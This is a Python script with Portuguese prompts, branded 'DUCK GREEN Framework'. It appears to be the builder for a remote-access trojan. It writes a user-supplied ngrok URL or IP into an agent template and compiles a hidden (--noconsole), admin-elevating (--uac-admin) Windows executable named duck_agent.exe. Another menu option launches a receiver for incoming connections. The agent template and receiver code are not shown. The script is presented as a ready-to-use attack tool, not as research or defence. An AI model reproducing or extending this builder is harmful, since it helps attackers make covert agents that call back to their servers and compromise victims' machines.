import os
import sys
import time

# Cores para o terminal
GREEN = '\033[0;32m'
BLUE = '\033[0;34m'
YELLOW = '\033[1;33m'
RED = '\033[0;31m'
NC = '\033[0m'


def banner():
    os.system('clear')
    print(f"""{GREEN}
    ██████╗ ██╗   ██╗ ██████╗██╗  ██╗     ██████╗ ██████╗ ███████╗███████╗███╗   ██╗
    ██╔══██╗██║   ██║██╔════╝██║ ██╔╝    ██╔════╝ ██╔══██╗██╔════╝██╔════╝████╗  ██║
    ██║  ██║██║   ██║██║     █████╔╝     ██║  ███╗██████╔╝█████╗  █████╗  ██╔██╗ ██║
    ██║  ██║██║   ██║██║     ██╔═██╗     ██║   ██║██╔══██╗██╔════╝██╔════╝██║╚██╗██║
    ██████╔╝╚██████╔╝╚██████╗██║  ██╗    ╚██████╔╝██║  ██║███████╗███████╗██║ ╚████║
    ╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝     ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝
    {BLUE}            [ Tool by Duck - DUCK GREEN Framework v1.0 ]{NC}
    """)


def build_agent():
    banner()
    print(f"{YELLOW}[*] CONFIGURAÇÃO DO AGENTE DUCK GREEN{NC}")
    remote_url = input(f"\n[?] Insira a URL do Ngrok ou IP (ex: https://abc.ngrok-free.app): ").strip()

    if not remote_url:
        print(f"{RED}[!] URL inválida!{NC}");
        time.sleep(2);
        return

    try:
        template_path = "modules/agente_template.py"
        with open(template_path, "r", encoding="utf-8") as f:
            source_code = f.read()

        new_code = source_code.replace("REPLACE_ME_URL", remote_url)
        temp_file = "modules/build_temp.py"
        with open(temp_file, "w", encoding="utf-8") as f:
            f.write(new_code)

        print(f"\n{BLUE}[*] A iniciar compilação via Wine/PyInstaller...{NC}")
        build_command = f"wine pyinstaller --noconsole --onefile --uac-admin --distpath ./output --name duck_agent {temp_file}"
        os.system(build_command)

        if os.path.exists(temp_file): os.remove(temp_file)
        print(f"\n{GREEN}[+] SUCESSO! Ficheiro em: output/duck_agent.exe{NC}")
        input("\nPressione Enter...")
    except Exception as e:
        print(f"{RED}[!] Erro: {e}{NC}");
        input()


def main():
    os.makedirs("modules", exist_ok=True)
    os.makedirs("output", exist_ok=True)
    while True:
        banner()
        print(f" {BLUE}[1]{NC} Gerar Agente (.exe)\n {BLUE}[2]{NC} Iniciar Receptor\n {BLUE}[0]{NC} Sair")
        choice = input(f"\n{YELLOW}Escolha: {NC}")
        if choice == "1":
            build_agent()
        elif choice == "2":
            os.system("python3 modules/receptor.py")
        elif choice == "0":
            sys.exit()


if __name__ == "__main__":
    main()